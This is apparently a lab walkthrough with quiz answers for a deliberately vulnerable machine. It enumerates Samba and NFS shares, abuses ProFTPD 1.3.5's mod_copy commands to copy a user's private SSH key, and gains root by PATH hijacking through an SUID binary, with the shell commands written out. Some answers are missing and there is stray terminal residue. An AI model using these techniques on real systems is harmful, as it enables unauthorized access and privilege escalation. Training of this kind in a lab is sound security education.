>[Task 1] Deploy the vulnerable machine  

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

Make sure you're connected to our network and deploy the machine

**answer: No answer need**

Scan the machine with nmap, how many ports are open?
**answer: 7**

[Task 2] Enumerating Samba for shares

Using the nmap command above, how many shares have been found?

    $ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.60.211
    Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-20 10:42 CET

On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.

    smbclient //[ip]/anonymous

Using your machine, connect to the machines network share.

Once you're connected, list the files on the share. What is the file can you see?

**answer: log.txt**



You can recursively download the SMB share too. Submit the username and password as nothing.

    smbget -R smb://[ip]/anonymous

Open the file on the share. There is a few interesting things found.

Information about the ProFTPD server.

What port is FTP running on?

**answer: 21**


Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.60.211

What mount can we see?

**answer: /var**

[Task 3] Gain initial access with ProFtpd



Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

What is the version?

    $ nc 10.10.60.211 21

**answer: 1.3.5**



We can use searchsploit to find exploits for a particular software version.

Searchsploit is basically just a command line search tool for exploit-db.com.

How many exploits are there for the ProFTPd running?

**answer: 3**


You should have found an exploit from ProFtpd's mod_copy module.

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.

**answer: No answer need**

We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.


We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

**answer: No answer need**

Lets mount the /var/tmp directory to our machine

    $ mkdir /mnt/kenobiNFS
    $ mount machine_ip:/var /mnt/kenobiNFS
    $ ls -la /mnt/kenobiNFS

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.

What is Kenobi's user flag (/home/kenobi/user.txt)?

    $ sudo mkdir /mnt/kenobiNFS                                                                                 1 тип

[Task 4] Privilege Escalation with Path Variable Manipulation




SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: find / -perm -u=s -type f 2>/dev/null

What file looks particularly out of the ordinary?

**answer: /usr/bin/menu**

Run the binary, how many options appear?

**answer: 3**

Strings is a command on Linux that looks for human readable strings on a binary.

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

    kenobi@kenobi:~$ cd /tmp/
    kenobi@kenobi:/tmp$ echo /bin/sh > curl
    kenobi@kenobi:/tmp$ chmod 777 curl
    kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
    kenobi@kenobi:/tmp$ echo $PATH
    /tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
    kenobi@kenobi:/tmp$ /usr/bin/menu
